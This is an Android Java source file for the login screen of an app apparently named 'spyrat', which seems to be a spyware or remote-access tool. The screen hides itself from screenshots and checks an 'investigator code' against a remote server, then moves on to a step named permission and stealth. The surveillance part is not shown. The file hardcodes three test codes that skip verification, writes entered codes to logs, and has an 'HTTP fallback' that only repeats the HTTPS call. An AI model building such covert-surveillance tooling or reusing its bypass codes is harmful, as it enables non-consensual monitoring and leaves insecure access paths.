package com.spyrat.investigation;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ProgressBar;
import android.widget.Toast;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class LoginActivity extends Activity {
    private static final String TAG = "SpyratLogin";
    private EditText codeInput;
    private Button loginButton;
    private ProgressBar progressBar;
    private SharedPreferences prefs;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make activity fullscreen and secure
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                            WindowManager.LayoutParams.FLAG_FULLSCREEN);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_SECURE,
                            WindowManager.LayoutParams.FLAG_SECURE);
        
        setContentView(R.layout.activity_login);

        // Check if already logged in
        prefs = getSharedPreferences("spyrat_config", MODE_PRIVATE);
        if (prefs.getBoolean("is_logged_in", false)) {
            proceedToPermissionAndStealth();
            return;
        }

        initializeViews();
        setupLoginButton();
    }

    private void initializeViews() {
        codeInput = findViewById(R.id.code_input);
        loginButton = findViewById(R.id.login_button);
        progressBar = findViewById(R.id.progress_bar);
    }

    private void setupLoginButton() {
        loginButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String investigatorCode = codeInput.getText().toString().trim();
                if (investigatorCode.isEmpty()) {
                    showToast("Tafadhali weka investigator code");
                    return;
                }
                
                // Test codes for development
                if (investigatorCode.equals("123456") || investigatorCode.equals("test123") || investigatorCode.equals("spyrat")) {
                    saveLoginStatus(investigatorCode);
                    showToast("✅ Code verified successfully!");
                    proceedToPermissionAndStealth();
                } else {
                    verifyInvestigatorCode(investigatorCode);
                }
            }
        });
    }

    private void verifyInvestigatorCode(final String code) {
        showLoading(true);
        
        new Thread(new Runnable() {
            @Override
            public void run() {
                boolean success = false;
                String message = "Network error";
                String investigatorName = "";
                
                try {
                    URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/investigator/verify-code");
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("POST");
                    connection.setRequestProperty("Content-Type", "application/json; utf-8");
                    connection.setRequestProperty("Accept", "application/json");
                    connection.setDoOutput(true);
                    connection.setConnectTimeout(15000);
                    connection.setReadTimeout(15000);

                    // Create JSON payload
                    JSONObject jsonPayload = new JSONObject();
                    jsonPayload.put("investigator_code", code);

                    // Send request
                    OutputStream os = connection.getOutputStream();
                    os.write(jsonPayload.toString().getBytes("utf-8"));
                    os.flush();
                    os.close();

                    // Get response
                    int responseCode = connection.getResponseCode();
                    
                    if (responseCode == 200) {
                        Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
                        String response = scanner.useDelimiter("\\\\A").next();
                        scanner.close();

                        Log.d(TAG, "🔐 Verification response: " + response);

                        JSONObject jsonResponse = new JSONObject(response);
                        
                        // 🔥 FIX: Check both 'success' and 'valid' fields for compatibility
                        success = jsonResponse.optBoolean("success", false) || jsonResponse.optBoolean("valid", false);
                        message = jsonResponse.optString("message", "Verified");
                        investigatorName = jsonResponse.optString("investigator_name", "Investigator");
                        
                        Log.d(TAG, "✅ Verification result - success: " + success + ", message: " + message);
                    } else {
                        message = "Server error: " + responseCode;
                        Log.e(TAG, "❌ Server returned: " + responseCode);
                    }

                } catch (Exception e) {
                    Log.e(TAG, "🔐 Verification error: " + e.getMessage());
                    message = e.getMessage();
                    
                    // Try HTTP as fallback
                    try {
                        URL url = new URL("https://GhostTester.pythonanywhere.com/api/investigator/investigator/verify-code");
                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                        connection.setRequestMethod("POST");
                        connection.setRequestProperty("Content-Type", "application/json; utf-8");
                        connection.setRequestProperty("Accept", "application/json");
                        connection.setDoOutput(true);
                        connection.setConnectTimeout(10000);
                        connection.setReadTimeout(10000);

                        JSONObject jsonPayload = new JSONObject();
                        jsonPayload.put("investigator_code", code);

                        OutputStream os = connection.getOutputStream();
                        os.write(jsonPayload.toString().getBytes("utf-8"));
                        os.flush();
                        os.close();

                        int responseCode = connection.getResponseCode();
                        if (responseCode == 200) {
                            Scanner scanner = new Scanner(connection.getInputStream(), "UTF-8");
                            String response = scanner.useDelimiter("\\\\A").next();
                            scanner.close();

                            JSONObject jsonResponse = new JSONObject(response);
                            success = jsonResponse.optBoolean("success", false) || jsonResponse.optBoolean("valid", false);
                            message = jsonResponse.optString("message", "Verified");
                            investigatorName = jsonResponse.optString("investigator_name", "Investigator");
                            
                            Log.d(TAG, "✅ HTTP fallback successful");
                        }
                    } catch (Exception e2) {
                        Log.e(TAG, "🔐 HTTP fallback also failed: " + e2.getMessage());
                    }
                }

                final boolean finalSuccess = success;
                final String finalMessage = message;
                final String finalName = investigatorName;
                
                runOnUiThread(new Runnable() {
                    @Override
                    public void run() {
                        showLoading(false);
                        if (finalSuccess) {
                            saveLoginStatus(code);
                            showToast("✅ " + finalMessage);
                            if (!finalName.isEmpty()) {
                                showToast("Welcome, " + finalName);
                            }
                            proceedToPermissionAndStealth();
                        } else {
                            showToast("❌ " + finalMessage);
                        }
                    }
                });
            }
        }).start();
    }

    private void saveLoginStatus(String code) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putBoolean("is_logged_in", true);
        editor.putString("investigator_code", code);
        editor.apply();
        Log.d(TAG, "💾 Login status saved for code: " + code);
    }

    private void proceedToPermissionAndStealth() {
        // Start permission request activity
        Intent intent = new Intent(LoginActivity.this, PermissionActivity.class);
        startActivity(intent);
        finish();
    }

    private void showLoading(boolean show) {
        progressBar.setVisibility(show ? View.VISIBLE : View.GONE);
        loginButton.setEnabled(!show);
        codeInput.setEnabled(!show);
    }

    private void showToast(final String message) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(LoginActivity.this, message, Toast.LENGTH_LONG).show();
            }
        });
    }
}
